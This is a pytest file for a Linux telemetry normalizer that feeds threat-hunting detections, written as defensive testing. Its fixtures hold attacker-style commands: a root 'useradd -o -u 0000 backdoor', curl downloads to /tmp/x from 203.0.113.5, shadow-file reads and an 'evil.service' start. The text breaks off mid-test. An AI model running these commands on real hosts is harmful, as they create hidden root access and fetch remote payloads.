"""Linux host telemetry as Filebeat, Elastic Agent and Auditbeat index it reads as the dev importer's records do."""
from __future__ import annotations

import json
from datetime import UTC, datetime

import pytest

from romulus.detect.registry import ALL_PLAYBOOKS
from romulus.evidence.auditd import AuditParseError, parse_record, record_from_agent_fields
from romulus.evidence.linux_catalog import (
    LINUX_SHIPPER_DATASETS,
    exec_capable_dataset,
    match_shape,
    shipper_names,
    unmatched_families,
    with_logical,
)
from romulus.evidence.normalize import (
    JOURNAL_COPY_UNKEYED,
    RECONSTRUCTED_CAVEAT,
    SHIPPER_SSH_CAVEAT,
    SYSLOG_TIME_CAVEAT,
    SYSLOG_WRITER_CAVEAT,
    group_audit,
    normalize_hits,
)
from romulus.hunt import sweep as sw
from romulus.sources.compile import compile_es
from romulus.sources.models import Predicate, SearchIntent, Window
from romulus.sources.profile import contract_from_types
from tests import linux_shipper_fixtures as fx

# what may differ between shapes of one activity: provenance, the flag and caveats saying a shipper parsed it, and
# the record's own host name a shipper indexed beside host.name
SHAPE_ONLY_FIELDS = {"audit.reconstructed", "host.hostname", "host.node"}


def _events(hits):
    events, skips, errors = normalize_hits(list(hits))
    assert not errors, errors
    return events, skips


def _view(event) -> tuple:
    fields = {name: value.value for name, value in event.fields.items() if name not in SHAPE_ONLY_FIELDS}
    return (event.family, event.outcome.value, event.host, event.ts.isoformat(), json.dumps(fields, sort_keys=True,
                                                                                           default=str))


def _views(events) -> list[tuple]:
    return sorted(_view(event) for event in events)


AUDIT_ACTIVITIES = {
    "exec": (fx.exec_lines, fx.auditbeat_exec),
    "connect": (fx.connect_lines, fx.auditbeat_connect),
    "shadow_open": (fx.shadow_lines, fx.auditbeat_shadow),
    "insmod": (fx.insmod_lines, fx.auditbeat_insmod),
    "ssh_login": (fx.login_lines, fx.auditbeat_login),
    "useradd": (fx.useradd_lines, fx.auditbeat_useradd),
}


def _audit_shapes(lines, auditbeat_doc):
    return {
        "filebeat module (raw line kept)": fx.filebeat_audit(lines),
        "agent fields only": fx.agent_audit(lines),
        "agent preserve_original_event": fx.agent_audit(lines, preserve=True, prefix="agentp"),
        "auditbeat raw array": [fx.auditbeat_raw(lines)],
        "auditd manager raw string": [fx.auditbeat_raw(lines, native_id="am-raw", joined=True)],
        "auditbeat fields only": [auditbeat_doc()],
        "auditbeat fields only, no dataset": [_undated(auditbeat_doc())],
    }


def _undated(doc):
    del doc["_source"]["event"]["dataset"]
    doc["_id"] += "-undated"
    return doc


@pytest.mark.parametrize("activity", sorted(AUDIT_ACTIVITIES))
def test_each_audit_shape_gives_the_dev_shape_typed_events(activity):
    lines_of, auditbeat_doc = AUDIT_ACTIVITIES[activity]
    lines = lines_of()
    dev, _ = _events(fx.dev_audit(lines))
    assert dev, activity
    for shape, hits in _audit_shapes(lines, auditbeat_doc).items():
        got, _ = _events(hits)
        assert _views(got) == _views(dev), (activity, shape)
        rebuilt = shape.startswith(("agent fields only", "auditbeat fields only"))
        for event in got:
            assert event.has("audit.reconstructed") is rebuilt, (activity, shape, event.family)
            assert (RECONSTRUCTED_CAVEAT in event.caveats) is rebuilt
            if rebuilt:
                # provenance names indexed fields, never raw text that was not indexed
                assert not any("event.original#auditd" in value.origin for value in event.fields.values())
            assert {ref.native_id for ref in event.raw} <= {h["_id"] for h in hits}
            assert len(event.raw) == len({ref.key for ref in event.raw})


def test_hex_argument_left_hex_by_the_pipeline_is_decoded_and_says_so():
    lines = fx.exec_lines()
    exec_event = next(e for e in _events(fx.agent_audit(lines))[0] if e.family == "process_exec")
    assert exec_event.get("process.argv")[3] == "http://203.0.113.5/a b"
    assert exec_event.fields["process.argv"].origin == "agent-1:process.args"
    assert any(c.startswith("Decoded from hex") and "EXECVE.a3" in c for c in exec_event.caveats)
    assert exec_event.fields["audit.time"].origin == "agent-1:@timestamp"
    assert exec_event.fields["process.pid"].origin == "agent-0:process.pid"


@pytest.mark.parametrize("arg", ["0000", "4000", "1234", "20", "0755", "00", "deadbeef", "2020", "4142"])
def test_numeric_and_hex_looking_arguments_stay_literal(arg):
    hits = fx.agent_audit(fx.exec_lines(argv=["find", "/", "-perm", arg]))
    exec_event = next(e for e in _events(hits)[0] if e.family == "process_exec")
    assert exec_event.get("process.argv") == ["find", "/", "-perm", arg]
    assert not any(c.startswith("Decoded from hex") for c in exec_event.caveats)


def test_a_hex_encoded_argument_with_a_space_decodes_and_says_so():
    hits = fx.agent_audit(fx.exec_lines(argv=["sh", "-c", "echo hi"], exe="/bin/sh"))
    assert hits[1]["_source"]["process"]["args"][2] == fx.hexs("echo hi")
    exec_event = next(e for e in _events(hits)[0] if e.family == "process_exec")
    assert exec_event.get("process.argv") == ["sh", "-c", "echo hi"]
    assert any(c.startswith("Decoded from hex") and "EXECVE.a2" in c for c in exec_event.caveats)


def test_uid_zero_account_creation_keeps_its_lane_in_the_agent_shape(tmp_path):
    lines = fx.exec_lines(argv=["useradd", "-o", "-u", "0000", "backdoor"], exe="/usr/sbin/useradd", uid="0")
    dev, _ = _events(fx.dev_audit(lines))
    agent, _ = _events(fx.agent_audit(lines))
    want = _run("host.account_or_group_change", dev, tmp_path / "dev")
    assert want
    assert _run("host.account_or_group_change", agent, tmp_path / "agent") == want


def test_more_elements_than_argc_keep_only_arguments_before_a_possible_chunk():
    hits = fx.agent_audit(fx.exec_lines())
    hits[1]["_source"]["process"]["args"] = ["curl", "-o", "/tmp/x", "6162636465", "6667", "tail"]
    exec_event = next(e for e in normalize_hits(hits)[0] if e.family == "process_exec")
    assert exec_event.get("process.argv") == ["curl", "-o", "/tmp/x"]
    assert exec_event.get("process.argv_complete") is False


def test_agent_truncated_argument_marker_makes_the_command_line_incomplete():
    lines = fx.exec_lines()
    hits = fx.agent_audit(lines)
    execve = hits[1]["_source"]
    execve["process"]["args"] = ["[... 2 truncated arguments ...]", "/tmp/x", "http://203.0.113.5/"]
    execve["process"].pop("args_count")
    events, _skips, errors = normalize_hits(hits)
    exec_event = next(e for e in events if e.family == "process_exec")
    assert exec_event.get("process.argv_complete") is False
    assert any("only the arguments from a2 on" in c for c in exec_event.caveats)
    assert errors          # the partition cannot assure a negative over an incomplete command line


def test_agent_count_mismatch_makes_the_command_line_incomplete():
    hits = fx.agent_audit(fx.exec_lines())
    hits[1]["_source"]["process"]["args"] = hits[1]["_source"]["process"]["args"][:3]
    events, _skips, _errors = normalize_hits(hits)
    exec_event = next(e for e in events if e.family == "process_exec")
    assert exec_event.get("process.argv_complete") is False


def test_agent_split_execve_records_never_splice_chunks():
    hits = fx.agent_audit(fx.exec_lines())
    continuation = json.loads(json.dumps(hits[1]))
    continuation["_id"] = "agent-cont"
    continuation["_source"]["process"] = {"args": ["[... 3 truncated arguments ...]", "6578747261"]}
    events, _skips, _errors = normalize_hits([*hits, continuation])
    exec_event = next(e for e in events if e.family == "process_exec")
    assert exec_event.get("process.argv_complete") is False


# ---------------------------------------------------------------------------------------------------------------
# The pipeline's own documented outputs: rebuilt records agree with the raw parse on what normalizers read
# ---------------------------------------------------------------------------------------------------------------

# Raw records and the document the Auditd Logs pipeline writes for each, restated from its documented behaviour
# (keys it keeps in auditd.log, its ECS moves, booleans, the x86_64 arch name, go-libaudit's identity copies).
PIPELINE_PAIRS = [
    (("type=SYSCALL msg=audit(1485893834.891:18877199): arch=c000003e syscall=44 success=yes exit=184 a0=9 items=0 "
     "ppid=1240 pid=1281 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) "
     "ses=4294967295 comm=\"charon\" exe=2F7573722F6C6962657865632F7374726F6E677377616E2F636861726F6E202864656C65746"
     "56429 key=(null)"),
     {"@timestamp": "2017-01-31T20:17:14.891Z",
      "auditd": {"log": {"a0": "9", "items": "0", "record_type": "SYSCALL", "sequence": 18877199,
                         "ses": "4294967295", "success": True, "syscall": "44", "tty": "(none)"}},
      "host": {"architecture": "x86_64"},
      "process": {"executable": "/usr/libexec/strongswan/charon (deleted)", "exit_code": 184, "name": "charon",
                  "parent": {"pid": 1240}, "pid": 1281},
      "user": {"audit": {"id": "4294967295"}, "effective": {"group": {"id": "0"}, "id": "0"},
               "filesystem": {"group": {"id": "0"}, "id": "0"}, "group": {"id": "0"}, "id": "0",
               "saved": {"group": {"id": "0"}, "id": "0"}}}),
    ("type=EXECVE msg=audit(1581371984.206:579393): argc=1 a0=top",
     {"@timestamp": "2020-02-10T21:59:44.206Z", "auditd": {"log": {"record_type": "EXECVE", "sequence": 579393}},
      "process": {"args": ["top"], "args_count": 1, "executable": "top"}}),
    ("type=KERN_MODULE msg=audit(1581371984.206:579397): name=mymodule",
     {"@timestamp": "2020-02-10T21:59:44.206Z", "event": {"action": ["loaded-kernel-module"]},
      "auditd": {"log": {"name": "mymodule", "record_type": "KERN_MODULE", "sequence": 579397}}}),
    ("type=PROCTITLE msg=audit(1451781471.394:194440): proctitle=737368643A206275726E205B707269765D",
     {"@timestamp": "2016-01-03T00:37:51.394Z",
      "auditd": {"log": {"proctitle": "sshd: burn [priv]", "record_type": "PROCTITLE", "sequence": 194440}}}),
    (("node=localhost.localdomain type=CONFIG_CHANGE msg=audit(1594053514.707:5): audit_failure=1 old=1 "
     "auid=4294967295 ses=4294967295 subj=system_u:system_r:unconfined_service_t:s0 res=1"),
     {"@timestamp": "2020-07-06T16:38:34.707Z", "event": {"outcome": "success"},
      "auditd": {"log": {"audit_failure": "1", "node": "localhost.localdomain", "old": "1",
                         "record_type": "CONFIG_CHANGE", "sequence": 5, "ses": "4294967295",
                         "subj": "system_u:system_r:unconfined_service_t:s0"}},
      "user": {"audit": {"id": "4294967295"}}}),
    (("node=localhost.localdomain type=SERVICE_START msg=audit(1594053514.709:6): pid=1 uid=0 auid=4294967295 "
     "ses=4294967295 subj=system_u:system_r:init_t:s0 msg='unit=auditd comm=\"systemd\" "
     "exe=\"/usr/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'"),
     {"@timestamp": "2020-07-06T16:38:34.709Z", "event": {"outcome": "success"},
      "auditd": {"log": {"node": "localhost.localdomain", "record_type": "SERVICE_START", "sequence": 6,
                         "ses": "4294967295", "subj": "system_u:system_r:init_t:s0", "unit": "auditd"}},
      "process": {"executable": "/usr/lib/systemd/systemd", "name": "systemd", "pid": 1},
      "user": {"audit": {"id": "4294967295"}, "id": "0"}}),
    (("type=USER_START msg=audit(1489519256.193:19600331): user pid=4151 uid=0 auid=700 ses=11988 "
     "msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=? res=success'"),
     {"@timestamp": "2017-03-14T19:20:56.193Z", "event": {"outcome": "success"},
      "auditd": {"log": {"op": "PAM:session_open", "record_type": "USER_START", "sequence": 19600331,
                         "ses": "11988", "uid": "0"}},
      "process": {"executable": "/usr/bin/sudo", "pid": 4151},
      "user": {"audit": {"id": "700"}, "effective": {"name": "root"}, "id": "700", "name": "root"}}),
    (("type=ADD_GROUP msg=audit(1481076992.414:385): pid=1235 uid=0 auid=4294967295 ses=4294967295 "
     "subj=system_u:system_r:unconfined_service_t:s0 msg='op=add-group id=1000 exe=\"/usr/sbin/groupadd\" "
     "hostname=? addr=? terminal=? res=success'"),
     {"@timestamp": "2016-12-07T02:16:32.414Z", "event": {"outcome": "success"},
      "auditd": {"log": {"id": "1000", "op": "add-group", "record_type": "ADD_GROUP", "sequence": 385,
                         "ses": "4294967295", "subj": "system_u:system_r:unconfined_service_t:s0", "uid": "0"}},
      "group": {"id": "1000"}, "process": {"executable": "/usr/sbin/groupadd", "pid": 1235},
      "user": {"audit": {"id": "4294967295"}, "effective": {"id": "0"}, "id": "4294967295"}}),
    (("type=USER_LOGIN msg=audit(1481077043.193:421): pid=1298 uid=0 auid=1000 ses=1 "
     "subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=login id=1000 exe=\"/usr/sbin/sshd\" "
     "hostname=pool-96-241-146-97.washdc.fios.verizon.net addr=89.160.20.156 terminal=/dev/pts/0 res=success'"),
     {"@timestamp": "2016-12-07T02:17:23.193Z", "event": {"outcome": "success"},
      "auditd": {"log": {"hostname": "pool-96-241-146-97.washdc.fios.verizon.net", "id": "1000", "op": "login",
                         "record_type": "USER_LOGIN", "sequence": 421, "ses": "1",
                         "subj": "system_u:system_r:sshd_t:s0-s0:c0.c1023", "uid": "0"}},
      "process": {"executable": "/usr/sbin/sshd", "pid": 1298},
      "source": {"address": "89.160.20.156", "ip": "89.160.20.156"},
      "user": {"audit": {"id": "1000"}, "effective": {"id": "1000"}, "id": "1000", "terminal": "/dev/pts/0"}}),
    ("type=CWD msg=audit(1481077231.371:479):  cwd=\"/home/some_user\"",
     {"@timestamp": "2016-12-07T02:20:31.371Z", "auditd": {"log": {"record_type": "CWD", "sequence": 479}},
      "process": {"working_directory": "/home/some_user"}}),
    (("type=PATH msg=audit(1481077231.371:479): item=0 name=\"/sbin/auditctl\" inode=17367907 dev=08:01 "
     "mode=0100750 ouid=0 ogid=0 rdev=00:00 obj=system_u:object_r:auditctl_exec_t:s0 objtype=NORMAL"),
     {"@timestamp": "2016-12-07T02:20:31.371Z",
      "auditd": {"log": {"dev": "08:01", "inode": "17367907", "item": "0", "mode": "0100750", "name": "/sbin/auditctl",
                         "obj": "system_u:object_r:auditctl_exec_t:s0", "objtype": "NORMAL", "rdev": "00:00",
                         "record_type": "PATH", "sequence": 479}},
      "user": {"owner": {"group": {"id": "0"}, "id": "0"}}}),
    ("type=SOCKADDR msg=audit(1481078424.953:688): saddr=02000050A9FEA9FE0000000000000000",
     {"@timestamp": "2016-12-07T02:40:24.953Z",
      "auditd": {"log": {"record_type": "SOCKADDR", "saddr": "02000050A9FEA9FE0000000000000000", "sequence": 688}}}),
    # the enriched form: names after \x1d, kept upper-case in auditd.log
    (("node=praorem001 type=SYSCALL msg=audit(1723109482.048:4981103): arch=c000003e syscall=87 success=yes exit=0 "
     "a0=7f1118081d10 a1=7f1118081d10 a2=242 a3=180 items=2 ppid=560201 pid=560348 auid=1561577791 uid=2012 "
     "gid=2007 euid=2012 suid=2012 fsuid=2012 egid=2007 sgid=2007 fsgid=2007 tty=(none) ses=126 comm=\"httpd\" "
     "exe=\"/app/bin/httpd\" key=\"delete\"\x1dARCH=x86_64 SYSCALL=unlink AUID=\"na-dba03\" UID=\"dllogc\" "
     "GID=\"oinstall\" EUID=\"dllogc\""),
     {"@timestamp": "2024-08-08T09:31:22.048Z",
      "auditd": {"log": {"ARCH": "x86_64", "AUID": "na-dba03", "EUID": "dllogc", "GID": "oinstall", "SYSCALL": "unlink",
                         "UID": "dllogc", "a0": "7f1118081d10", "a1": "7f1118081d10", "a2": "242", "a3": "180",
                         "items": "2", "key": "delete", "node": "praorem001", "record_type": "SYSCALL",
                         "sequence": 4981103, "ses": "126", "success": True, "syscall": "87", "tty": "(none)"}},
      "host": {"architecture": "x86_64"},
      "process": {"executable": "/app/bin/httpd", "exit_code": 0, "name": "httpd", "parent": {"pid": 560201},
                  "pid": 560348},
      "user": {"audit": {"id": "1561577791", "name": "na-dba03"}, "effective": {"id": "2012", "name": "dllogc"},
               "id": "2012", "name": "dllogc"}}),
    (("type=SERVICE_STOP msg=audit(1783582606.567:21853): pid=1 uid=0 auid=4294967295 ses=4294967295 "
     "msg='unit=rsyslog comm=\"systemd\" exe=\"/usr/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'"
     "\x1dUID=\"root\" AUID=\"unset\""),
     {"@timestamp": "2026-07-09T07:36:46.567Z", "event": {"outcome": "success"},
      "auditd": {"log": {"AUID": "unset", "UID": "root", "record_type": "SERVICE_STOP", "sequence": 21853,
                         "ses": "4294967295", "unit": "rsyslog"}},
      "process": {"executable": "/usr/lib/systemd/systemd", "name": "systemd", "pid": 1},
      "user": {"audit": {"id": "4294967295"}, "id": "0", "name": "root"}}),
    (("type=USER_CHAUTHTOK msg=audit(1784285181.000:3460): pid=625010 uid=0 auid=1005 ses=188532 subj=unconfined "
     "msg='op=PAM:chauthtok acct=\"example_target_user\" exe=\"/usr/bin/passwd\" hostname=host-03 addr=? "
     "terminal=pts/12 res=success'\x1dUID=\"root\" AUID=\"example_admin\""),
     {"@timestamp": "2026-07-17T10:46:21.000Z", "event": {"outcome": "success"},
      "auditd": {"log": {"AUID": "example_admin", "UID": "root", "hostname": "host-03", "op": "PAM:chauthtok",
                         "record_type": "USER_CHAUTHTOK", "sequence": 3460, "ses": "188532", "subj": "unconfined",
                         "uid": "0"}},
      "process": {"executable": "/usr/bin/passwd", "pid": 625010},
      "user": {"audit": {"id": "1005", "name": "example_admin"}, "effective": {"id": "0", "name": "root"},
               "id": "1005", "name": "example_admin", "target": {"name": "example_target_user"},
               "terminal": "pts/12"}}),
]
# Keys some normalizer reads, per record type.
READ_KEYS = {"pid", "ppid", "exe", "comm", "uid", "euid", "auid", "ses", "tty", "success", "exit", "arch", "syscall",
             "key", "a0", "a1", "a2", "a3", "items", "argc", "cwd", "name", "nametype", "inode", "dev", "mode", "ouid",
             "ogid", "item", "saddr", "acct", "id", "grp", "addr", "op", "res", "unit", "new-level", "old-level",
             "list", "old", "audit_failure"}
READ_ENRICHED = {"UID", "EUID", "AUID", "OUID", "OGID", "SYSCALL"}
# What the pipeline makes lossy, restated for each pair: (record type, key) the rebuilt record cannot hold.
PIPELINE_LOSSES = {
    # it renames `res` to event.outcome; the rebuilt record states the outcome's word, not the line's own token
    ("CONFIG_CHANGE", "res"), ("SERVICE_START", "res"), ("USER_START", "res"), ("ADD_GROUP", "res"),
    ("USER_LOGIN", "res"), ("SERVICE_STOP", "res"), ("USER_CHAUTHTOK", "res"),
    # a value of "?" is dropped: the record says the key was not known, the rebuilt one does not have it
    ("SERVICE_START", "addr"), ("USER_START", "addr"), ("ADD_GROUP", "addr"), ("SERVICE_STOP", "addr"),
    ("USER_CHAUTHTOK", "addr"),
    # (null) is dropped the same way
    ("SYSCALL", "key"),
    # the arch token is renamed to its name (x86_64) and removed: only a SYSCALL record carries host.architecture
    # back; other records never had it
    # a USER_START with an AUID enrichment: the copy put AUID's name in user.name, so acct's rename failed and acct
    # was removed; UID's name overwrote the copy of acct in user.effective
}


def _comparable(record, kind):
    keys = {key: value for key, value in record.fields.items() if key in READ_KEYS and (kind, key) not in
            PIPELINE_LOSSES}
    if "res" in keys:
        keys["res"] = keys["res"].strip("'\"")
    if record.type == "EXECVE":
        keys.update({k: v for k, v in record.fields.items() if k.startswith("a")})
    return keys


@pytest.mark.parametrize("line,document", PIPELINE_PAIRS, ids=[pair[0].split(" msg=")[0] for pair in PIPELINE_PAIRS])
def test_rebuilt_record_agrees_with_the_raw_parse_on_every_key_normalizers_read(line, document):
    raw = parse_record(line)
    rebuilt = record_from_agent_fields(document)
    assert (rebuilt.type, rebuilt.serial) == (raw.type, raw.serial)
    assert round(rebuilt.ts, 3) == round(raw.ts, 3)
    want = _comparable(raw, raw.type)
    got = _comparable(rebuilt, raw.type)
    # a user message's own keys are the tokenizer's msg= pair in the raw parse; compare their values instead
    for key in ("op", "unit", "acct", "id", "exe", "hostname", "res"):
        if key in want or raw.fields.get("msg", "").startswith(f"'{key}="):
            value = raw.fields.get("msg", "")[len(key) + 2:] if raw.fields.get("msg", "").startswith(f"'{key}=") \
                else want.get(key)
            if value is not None and (raw.type, key) not in PIPELINE_LOSSES:
                want[key] = value.strip("'\"")
    want.pop("msg", None)
    assert got == {k: v for k, v in want.items() if k in got or (raw.type, k) not in PIPELINE_LOSSES}, line
    assert {k: v for k, v in rebuilt.enriched.items() if k in READ_ENRICHED} == {
        k: v for k, v in raw.enriched.items() if k in READ_ENRICHED}


def test_rebuilt_user_start_takes_acct_from_the_copy_when_no_enrichment_overwrote_it():
    record = record_from_agent_fields(PIPELINE_PAIRS[6][1])
    assert record.fields["acct"] == "root" and record.origins["acct"] == "user.effective.name"
    assert record.fields["uid"] == "0" and record.origins["uid"] == "auditd.log.uid"


def test_rebuilt_account_record_loses_acct_when_the_enrichment_overwrote_the_copy():
    # USER_CHAUTHTOK with acct: the copy put acct into user.target.name (no ID enrichment), so it is recovered
    record = record_from_agent_fields(PIPELINE_PAIRS[-1][1])
    assert record.fields["acct"] == "example_target_user"
    # ADD_GROUP with id: acct (absent here) would have lost to id; group.id is not taken for acct
    group = record_from_agent_fields(PIPELINE_PAIRS[7][1])
    assert "acct" not in group.fields and group.fields["id"] == "1000"


def test_pre_parsed_syscall_names_resolve_to_numbers_by_arch():
    document = {"@timestamp": "2017-01-31T20:17:14.891Z",
                "auditd": {"log": {"record_type": "SYSCALL", "sequence": "18877199", "arch": "x86_64",
                                   "syscall": "connect", "success": "yes", "exit": "0", "a0": "3", "pid": "5678",
                                   "ppid": "1234", "comm": "ls", "exe": "/bin/ls", "uid": "0", "auid": "1000"}}}
    record = record_from_agent_fields(document)
    assert (record.fields["arch"], record.fields["syscall"]) == ("c000003e", "42")


def test_syscall_without_a_known_arch_is_unsupported_not_a_negative():
    hits = fx.agent_audit(fx.connect_lines())
    del hits[0]["_source"]["host"]["architecture"]
    events, _skips, errors = normalize_hits(hits)
    assert not [e for e in events if e.family == "net_socket"]
    assert [msg for _id, msg in errors if msg.startswith("linux.audit:") and "architecture" in msg]
    assert sw._error_tag(errors[0][1]) == "linux.audit"
    assert sw.DATASET_FAMILIES["linux.audit"] >= {"net_socket", "process_exec", "file_change"}
    with pytest.raises(AuditParseError):
        record_from_agent_fields(hits[0]["_source"])


def test_auditbeat_user_space_records_take_no_uid_from_the_audit_user():
    from romulus.evidence.normalize import auditbeat_records
    # go-libaudit: user.* is the audit uid (1000), user.effective.* the account tool's uid (0)
    useradd = fx.auditbeat_useradd()
    assert useradd["_source"]["user"]["id"] == "1000"
    event = next(e for e in _events([useradd])[0] if e.family == "account_change")
    assert (event.get("process.uid"), event.get("process.user")) == ("0", "root")
    # a login's user.effective is the account: the record's uid is not recorded, never taken from user.*
    login = fx.auditbeat_login()
    login["_source"]["user"]["id"] = "1000"
    main = auditbeat_records(login)[0][1]
    assert "uid" not in main.fields and "UID" not in main.enriched and "EUID" not in main.enriched
    assert main.fields["auid"] == "1000"


def test_auditbeat_documents_without_a_dataset_are_selected_and_counted(monkeypatch):
    from romulus.sources.models import Completeness, SearchOutcome
    contract = _contract(**{"event.module": "keyword", "input.type": "keyword"})
    clause = _clause(contract, "linux.audit")
    undated = [c for c in clause["bool"]["should"] if "must_not" in c.get("bool", {})]
    assert undated == [{"bool": {"filter": [{"term": {"event.module": "auditd"}}],
                                 "must_not": [{"exists": {"field": "event.dataset"}},
                                              {"exists": {"field": "data_stream.dataset"}}]}}]
    seen = []

    def fake_execute(_client, intent, _contract):
        seen.append(intent)
        return SearchOutcome(target=intent.target, fingerprint="f", started_at=WINDOW.start, ended_at=WINDOW.start,
                             completeness=Completeness.complete, buckets=[{"key": {}, "count": 7}])

    monkeypatch.setattr(sw, "execute", fake_execute)

    class Fake:
        _note_linux_shapes = sw.Sweep._note_linux_shapes
        _undated_shape_count = sw.Sweep._undated_shape_count

        def __init__(self):
            self.stats: dict = {}
            self._profiles = {"linux-x": {"datasets": {}}}
            self.client, self.window = object(), WINDOW

    fake = Fake()
    sw.Sweep._filters_for(fake, "linux-x", contract)
    inventory = fake.stats["linux_shipper_inventory"]["linux-x"]
    assert inventory["linux.audit"]["event.module:auditd"] == 7
    assert inventory["systemd.journal"]["input.type:journald"] == 7
    assert {p.field for intent in seen for p in intent.filters} == {"event.dataset", "event.module", "input.type"}


def test_auditbeat_actions_outside_the_table():
    # a call no family models, by a process the record names: the process is observed
    brk = fx.auditbeat_connect(native_id="ab-brk")
    brk["_source"]["event"]["action"] = "allocated-memory"
    brk["_source"]["auditd"]["data"] = {"arch": "x86_64", "syscall": "brk", "a0": "0", "exit": "0"}
    events, skips = _events([brk])
    assert [e.family for e in events] == ["process_observed"] and not skips
    # a user-space record naming no process tree: counted by its action, with no family
    cred = fx.auditbeat_login(native_id="ab-cred")
    cred["_source"]["event"]["action"] = "acquired-credentials"
    cred["_source"]["auditd"]["message_type"] = "cred_acq"
    events, skips = _events([cred])
    assert not events and skips == {"auditbeat action acquired-credentials is not normalized": 1}
    fed: dict = {}
    normalize_hits([cred], skip_families=fed)
    assert fed == {}


@pytest.mark.parametrize("shape", ["agent", "auditbeat"])
def test_a_cited_observation_rebuilds_from_its_one_record(shape):
    from romulus.evidence.normalize import observed_record
    hits = fx.agent_audit(fx.shadow_lines()) if shape == "agent" else [fx.auditbeat_shadow()]
    batch = next(e for e in _events(hits)[0] if e.family == "process_observed")
    again = observed_record(hits[0])
    assert again is not None and again.id == batch.id
    assert again.model_dump() == batch.model_dump()


@pytest.mark.parametrize("shape", ["dev", "agent"])
def test_the_indexed_host_name_is_the_host_and_the_node_is_typed(shape):
    lines = ["node=WEB01 " + line for line in fx.connect_lines()]
    hits = (fx.dev_audit if shape == "dev" else fx.agent_audit)(lines, host="web01")
    groups, errors = group_audit(hits)
    assert not errors and [key[0] for key in groups] == ["web01"]
    event = next(e for e in _events(hits)[0] if e.family == "net_socket")
    assert (event.host, event.get("host.node")) == ("web01", "WEB01")
    assert "auditd.log.node" in event.fields["host.node"].origin or "#auditd:node" in event.fields["host.node"].origin
    # a forwarded document that names no host.name: the record's node is the host, and the event says so
    for hit in hits:
        del hit["_source"]["host"]["name"]
    event = next(e for e in _events(hits)[0] if e.family == "net_socket")
    assert event.host == "WEB01" and any(c.startswith("Host from the record's own host name") for c in event.caveats)


def test_syslog_host_is_the_indexed_host_name_with_the_line_host_typed():
    line = fx.syslog("sshd", 2200, fx.sshd_journal()["MESSAGE"])
    line["_source"]["host"] = {"name": "web01", "hostname": "WEB01-LINE"}
    event = _events([line])[0][0]
    assert (event.host, event.get("host.hostname")) == ("web01", "WEB01-LINE")
    del line["_source"]["host"]["name"]
    assert _events([line])[0][0].host == "WEB01-LINE"


def test_journal_identity_needs_journald_s_own_name():
    # the System integration's journald stream puts the writer's chosen name in process.name: without journald's
    # captured _COMM the writer is identified by the header only
    plain = fx.syslog("sshd", 2200, fx.sshd_journal()["MESSAGE"], from_journal=True)
    assert SYSLOG_WRITER_CAVEAT in _events([plain])[0][0].caveats
    captured = fx.syslog("sshd", 2200, fx.sshd_journal()["MESSAGE"], from_journal=True)
    captured["_source"]["journald"] = {"process": {"name": "sshd"}}
    assert SYSLOG_WRITER_CAVEAT not in _events([captured])[0][0].caveats
    forged = fx.syslog("sshd", 2200, fx.sshd_journal()["MESSAGE"], from_journal=True)
    forged["_source"]["journald"] = {"process": {"name": "python3"}}
    events, skips = _events([forged])
    assert not events and skips == {"sshd-identified journal line written by another program": 1}


# ---------------------------------------------------------------------------------------------------------------
# journald and syslog
# ---------------------------------------------------------------------------------------------------------------

JOURNAL_ACTIVITIES = {"sshd_accepted": fx.sshd_journal, "sudo_failed": fx.sudo_journal, "unit_start": fx.unit_journal}


@pytest.mark.parametrize("activity", sorted(JOURNAL_ACTIVITIES))
@pytest.mark.parametrize("dataset,spelling", [("journald.logs", "new"), ("journald.logs", "old"), (None, "old"),
                                              (None, "new")])
def test_journald_field_shapes_give_the_dev_journal_events(activity, dataset, spelling):
    j = JOURNAL_ACTIVITIES[activity]()
    dev, _ = _events([fx.dev_journal(j)])
    got, _ = _events([fx.journald(j, dataset=dataset, spelling=spelling)])
    assert len(dev) == 1 and _views(got) == _views(dev)
    assert not any("event.original#journal" in value.origin for value in got[0].fields.values())


def _syslog_view_of(j):
    """The dev journal record holding only what a syslog line carries (no unit, boot, or journald process)."""
    keep = {"MESSAGE", "SYSLOG_IDENTIFIER", "_HOSTNAME", "_PID", "__REALTIME_TIMESTAMP", "UNIT", "JOB_TYPE",
            "JOB_RESULT", "MESSAGE_ID"}
    return {k: v for k, v in j.items() if k in keep}


SYSLOG_LINES = {
    "sshd_accepted": ("sshd", 2200, fx.sshd_journal),
    "sudo_failed": ("sudo", None, fx.sudo_journal),
}


@pytest.mark.parametrize("activity", sorted(SYSLOG_LINES))
@pytest.mark.parametrize("from_journal", [False, True])
def test_syslog_lines_with_their_message_give_the_journal_events(activity, from_journal):
    ident, pid, journal = SYSLOG_LINES[activity]
    j = _syslog_view_of(journal())
    dev, _ = _events([fx.dev_journal(j)])
    line = fx.syslog(ident, pid, j["MESSAGE"], ts=int(j["__REALTIME_TIMESTAMP"]) / 1e6, from_journal=from_journal)
    got, _ = _events([line])
    assert _views(got) == _views(dev)
    caveats = got[0].caveats
    assert (SYSLOG_TIME_CAVEAT in caveats) is (not from_journal)
    # no journald-captured _COMM is indexed here: the writer is the header's (or appname's) word either way
    assert SYSLOG_WRITER_CAVEAT in caveats


def test_systemd_unit_start_from_a_syslog_line():
    got, _ = _events([fx.syslog("systemd", 1, "Started evil.service.", dataset="system.syslog")])
    assert [(e.family, e.get("service.unit"), e.get("service.job"), e.get("service.job_phase")) for e in got] == [
        ("service_change", "evil.service", "start", "done")]


def test_shipper_parsed_syslog_lines_give_the_journal_events_with_a_caveat():
    sshd = _syslog_view_of(fx.sshd_journal())
    dev, _ = _events([fx.dev_journal(sshd)])
    got, _ = _events([fx.parsed_syslog("sshd", 2200, {
        "system.auth.ssh.event": "Accepted", "system.auth.ssh.method": "password", "user.name": "alice",
        "source.ip": "203.0.113.9", "source.port": 51515}, ts=int(sshd["__REALTIME_TIMESTAMP"]) / 1e6)])
    assert _views(got) == _views(dev)
    assert SHIPPER_SSH_CAVEAT in got[0].caveats
    sudo = _syslog_view_of(fx.sudo_journal())
    dev, _ = _events([fx.dev_journal(sudo)])
    got, _ = _events([fx.parsed_syslog("sudo", None, {
        "user.name": "bob", "system.auth.sudo": {"error": "3 incorrect password attempts", "tty": "pts/0",
                                                 "pwd": "/home/bob", "user": "root", "command": "/bin/bash"}},
